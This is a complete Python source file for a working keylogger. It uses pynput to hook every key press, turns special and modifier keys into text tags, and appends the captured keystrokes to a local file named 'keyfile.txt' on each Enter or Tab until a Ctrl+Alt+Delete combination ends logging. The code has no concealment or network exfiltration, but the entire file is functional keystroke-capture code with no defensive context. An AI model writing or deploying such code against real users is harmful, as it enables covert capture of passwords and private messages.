from pynput.keyboard import Key, Listener
from typing import Union

SPECIAL_KEY_REPRESENTATION = {
    Key.space: ' ',
    Key.enter: '\n',
    Key.esc: '[esc]',
    Key.tab: '[tab]'
}

MODIFIER_KEYS = {
    Key.ctrl_l: '[ctrl_l]',
    Key.ctrl_r: '[ctrl_r]',
    Key.shift_l: '[shift_l]',
    Key.shift_r: '[shift_r]',
    Key.alt_l: '[alt_l]',
    Key.alt_r: '[alt_r]',
    Key.alt_gr: '[alt_gr]',
    Key.caps_lock: '[caps_lock]'
}

SPECIAL_KEYS: dict[Key, str] = {**SPECIAL_KEY_REPRESENTATION, **MODIFIER_KEYS}
END_LOGGING_COMBINATION = {Key.ctrl_l, Key.alt_l, Key.delete}

keystroke_buffer: list[str] = []
currently_pressed_keys: set[Key] = set()

def remove_pressed_keys(target_key: Union[str, Key], 
                        current_keys: set[Union[str, Key]]) -> bool:
    """Removes pressed key from currently pressed keys.

    Checks whether 'target_key' exists in 'current_keys' and removes it
    if found. 

    Args:
        target_key (Union[str, Key]): Key to be removed 
            (Character or keyboard.Key).
        current_keys (Set[Union[str, Key]]): Set containing keys that are
            currently pressed.

    Returns:
        bool: True if key was found and removed, False otherwise
    """
    key_to_remove = None
    
    for key in current_keys:
        if (hasattr(key,'char') and hasattr(target_key,'char') 
                and key.char.lower() == target_key.char.lower()):
            key_to_remove = key
            break
        elif key == target_key:
            key_to_remove = key
            break
        
    if key_to_remove:
        current_keys.remove(key_to_remove)
        return True

    return False

def on_press(key: Union[str, Key]) -> None:
    """Handling key events, updating pressed keys and buffering character input
    
    If 'key' is not already in 'currently_pressed_keys', it is added. 
    Character keys are appended to 'keystroke_buffer', special keys are
    mapped using 'SPECIAL_KEYS', backslash/ delete removes the last entry
    from the buffer. Prevents logging keys multiple times when keys being pressed.

    Args:
        key (Union[str, Key]): Key that was pressed.
    """
    if key not in currently_pressed_keys:
        currently_pressed_keys.add(key)

        if hasattr(key, 'char') and key.char:
            keystroke_buffer.append(key.char)   
        elif key in SPECIAL_KEYS.keys():
            keystroke_buffer.append(SPECIAL_KEYS.get(key)) 
        elif ((key == Key.backspace or key == Key.delete) 
                and len(keystroke_buffer) > 0):
            keystroke_buffer.pop()

def on_release(key: Union[str, Key]) -> bool:
    """Handles key release events and exits logging when required.
    
    Removes released key from 'currently_pressed_keys' and writes buffered
    keystrokes to "keyfile.txt" if certain keys (Enter, Tab or the predefined
    'END_LOGGING_COMBINATION') are released.

    Args:
        key (Union[str, Key]): Key that was released.

    Returns:
        bool: False if logging process has ended, True otherwise.
    """
    is_logging_ended = END_LOGGING_COMBINATION.issubset(currently_pressed_keys)
    
    if key == Key.enter or key == Key.tab or is_logging_ended:
        with open("keyfile.txt", 'a', encoding="utf-8") as log:
            log.write(''.join(keystroke_buffer))
            keystroke_buffer.clear()
        
    remove_pressed_keys(key, currently_pressed_keys) 
    
    return not is_logging_ended

def main():
    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()
        
if __name__ == "__main__":
    main()